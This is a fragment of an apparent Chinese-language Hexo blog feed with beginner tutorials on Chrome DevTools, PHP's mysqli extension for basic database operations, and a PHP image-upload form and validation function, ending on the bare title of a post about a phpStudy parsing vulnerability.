class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="chrome调试工具"><a href="#chrome调试工具" class="headerlink" title="chrome调试工具"></a>chrome调试工具</h2><p>Chrome浏览器提供了一个非常好用的调试工具，可以用来调试我们的HTML结构和CSS样式。</p><h3 id="打开Chrome调试工具"><a href="#打开Chrome调试工具" class="headerlink" title="打开Chrome调试工具"></a>打开Chrome调试工具</h3><p>1、F12快捷键<br>2、Ctrl+Shift+i快捷键<br>3、右键空白处&#x3D;&gt;检查<br>4、设置&#x3D;&gt;更多工具&#x3D;&gt;开发者工具</p><h3 id="使用Chrome调试工具"><a href="#使用Chrome调试工具" class="headerlink" title="使用Chrome调试工具"></a>使用Chrome调试工具</h3><p><img src="https://img.xpctf.cn/img/20200917102721.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP MySQL扩展</title>
      <link href="/posts/b80b/"/>
      <url>/posts/b80b/</url>
      
        <content type="html"><![CDATA[<blockquote><p>PHP针对MySQL数据库提供的扩展，允许PHP当作MySQL的一个客户端连接MySQL服务端进行操作。</p></blockquote><h2 id="连库基本操作"><a href="#连库基本操作" class="headerlink" title="连库基本操作"></a>连库基本操作</h2><h3 id="开启扩展"><a href="#开启扩展" class="headerlink" title="开启扩展"></a>开启扩展</h3><p>在php.ini搜索php_mysqli.dll，如果没有搜索到新建一行写入extension&#x3D;php_mysqli.dll，如果存在则删掉前面的’;’<br><img src="https://img.xpctf.cn/img/20200905181302.png"><br>访问phpinfo，搜索mysqli，能搜索到则说明mysqli扩展加载成功。<br><img src="https://img.xpctf.cn/img/20200905181431.png"></p><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><p>PHP提供了一个面向过程的连接函数：mysqli_connect(服务器地址,用户名,密码,数据库名,端口,socket)，返回一个mysqli对象。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$like</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;mydb&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$like</span>);</span><br></pre></td></tr></table></figure><h3 id="设置编码"><a href="#设置编码" class="headerlink" title="设置编码"></a>设置编码</h3><p>mysql中不能识别’-‘，所以直接写utf8即可，不需要写utf-8。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式一：使用标准sql语句</span></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$like</span>,<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);<span class="comment">//bool(true)</span></span><br><span class="line"><span class="comment">//方式二：使用mysqli扩展函数</span></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_set_charset</span>(<span class="variable">$like</span>,<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);<span class="comment">//bool(true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取mysql编码</span></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_get_charset</span>(<span class="variable">$like</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure><h3 id="断开连接"><a href="#断开连接" class="headerlink" title="断开连接"></a>断开连接</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$like</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br></pre></td></tr></table></figure><h2 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h2><p>创建数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE News;</span><br><span class="line">use News;</span><br><span class="line">CREATE TABLE IF NOT EXISTS `News`(</span><br><span class="line">   `id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   `title` VARCHAR(100) NOT NULL,</span><br><span class="line">   `content` text NOT NULL,</span><br><span class="line">   `time` int,</span><br><span class="line">   PRIMARY KEY ( `id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><p>连接数据库：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;news&#x27;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$host</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$dbname</span>);</span><br></pre></td></tr></table></figure><h3 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h3><p>使用mysqli_query标准执行sql语句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;mysqli.php&#x27;</span>;</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into news values(null,&#x27;震惊,某学生居然学这个&#x27;,&#x27;今天，我开始学PHP了&#x27;,<span class="subst">&#123;$time&#125;</span>)&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;mysqli.php&#x27;</span>;</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update news set content=&#x27;太简单了，我两天就学会了&#x27; where id=1&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;mysqli.php&#x27;</span>;</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from news where id=1&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><blockquote><p>查询数据库在PHP开发中使用相当频繁，在数据库操作中占比90%以上，所以查询也较为复杂；查询返回结果集，SQL错误返回false；结果集转换为布尔类型永远为真。</p></blockquote><h3 id="执行查询"><a href="#执行查询" class="headerlink" title="执行查询"></a>执行查询</h3><p>查询数据库和其他的sql执行一样，都是使用mysqli_query来执行sql语句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;mysqli.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from news&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><h3 id="获取行数"><a href="#获取行数" class="headerlink" title="获取行数"></a>获取行数</h3><p>查询数据库会返回查询结果，可能包含了一行或者多行数据，使用 mysqli_num_rows($res) 函数获取返回的结果有多少行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;mysqli.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from news&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$num</span> = <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$res</span>);       <span class="comment">//获取结果集行数</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><h3 id="解析结果集"><a href="#解析结果集" class="headerlink" title="解析结果集"></a>解析结果集</h3><p>PHP不能直接使用结果集资源，必须将结果集转换成PHP能够解析的数据格式；通过从结果集中按照结果集指针所在位置取出对应的一条记录，返回一个数组，同时指针下移。当指针移除结果集外，返回NULL。</p><ol><li>mysqli_fetch_assoc() : 获取关联数组，列名作为数组下标，元素值作为数组元素</li><li>mysqli_fetch_row() : 获取索引数组，只获取数据的值，不获取列名</li><li>mysqli_fetch_array() : 获取关联或索引数组，默认同时存在，可以通过参数2来决定返回方式。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;mysqli.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from news&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><h3 id="遍历查询结果"><a href="#遍历查询结果" class="headerlink" title="遍历查询结果"></a>遍历查询结果</h3><p>使用while和foreach可以遍历全部返回值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;mysqli.php&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from news&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>))&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span> . <span class="string">&quot; : &quot;</span> . <span class="variable">$value</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL扩展 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件上传项目实战</title>
      <link href="/posts/14c3/"/>
      <url>/posts/14c3/</url>
      
        <content type="html"><![CDATA[<p>需求：控制上传类型，可选上传后缀，控制上传大小<br>1、前台代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;ch&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span></span><br><span class="line">          content=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">仅允许上传JPG，JPEG,PNG文件</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;index.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;image&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line"><span class="variable">$allow_format</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;upload&#x27;</span>;</span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line">    <span class="comment">//var_dump($file);</span></span><br><span class="line">    <span class="variable">$bool</span> = <span class="title function_ invoke__">api_upload</span>(<span class="variable">$file</span>, <span class="variable">$allow_type</span>, <span class="variable">$path</span>, <span class="variable">$error</span>, <span class="variable">$allow_format</span>, <span class="number">1000000</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$bool</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$error</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$bool</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、函数代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 函数功能:单文件上传</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>0 array $file 需要上传的文件信息:$_FILES[&#x27;name&#x27;]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>1 array $allow_type 允许上传的文件类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>2 string $path 上传路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>3 string &amp;$error 错误原因</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>4 array $allow_format = array() 允许上传的文件后缀</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>5 int $max_size = 2000000 允许上传的文件大小</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">api_upload</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$allow_type</span>,<span class="variable">$path</span>,&amp;<span class="variable">$error</span>,<span class="variable">$allow_format</span> = <span class="keyword">array</span>(<span class="params"></span>),<span class="variable">$max_size</span> = <span class="number">2000000</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//判断文件是否有效</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) || !<span class="keyword">isset</span>(<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;这不是一个有效的文件！&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断文件路径是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;文件路径不存在&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检查文件上传过程中是否出错</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;大小超出限制&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;上传过程出错&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;用户没有选择文件&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;文件写入失败&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检查文件类型是否合法</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;禁止上传该类型文件&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检查后缀名是否合法</span></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">ltrim</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>],<span class="string">&#x27;.&#x27;</span>),<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$allow_format</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$allow_format</span>))&#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;禁止上传该后缀文件&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查文件大小是否合法</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$max_size</span>)&#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;文件大小超过限制&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查文件是否为上传文件</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">       <span class="variable">$error</span> = <span class="string">&#x27;该文件不是上传文件&#x27;</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造文件名：类型_时间戳.后缀</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>],<span class="string">&#x27;/&#x27;</span>,<span class="literal">true</span>) . <span class="string">&#x27;_&#x27;</span> . (<span class="keyword">string</span>)<span class="title function_ invoke__">time</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">    <span class="comment">//移动文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$name</span>))&#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$name</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;文件移动失败&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy_pro解析漏洞</title>
      <link href="/posts/acf3/"/>
      <url>/posts/acf3/</url>
      
